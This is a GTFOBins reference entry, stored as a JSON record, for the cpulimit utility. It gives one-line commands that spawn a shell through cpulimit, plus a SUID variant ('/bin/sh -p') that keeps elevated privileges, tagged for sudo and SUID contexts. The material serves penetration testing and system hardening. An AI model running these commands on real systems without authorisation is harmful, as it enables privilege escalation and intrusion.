{"title": "cpulimit", "source": "gtfobins", "source_label": "GTFOBins", "path": "cpulimit", "html": "<h1>cpulimit</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">cpulimit -l 100 -f -- /bin/sh</code></pre>\n<p><strong>SUID override:</strong></p>\n<pre><code class=\"language-bash\">cpulimit -l 100 -f -- /bin/sh -p</code></pre>", "excerpt": "cpulimit Shell cpulimit -l 100 -f -- /bin/sh SUID override: cpulimit -l 100 -f -- /bin/sh -p", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}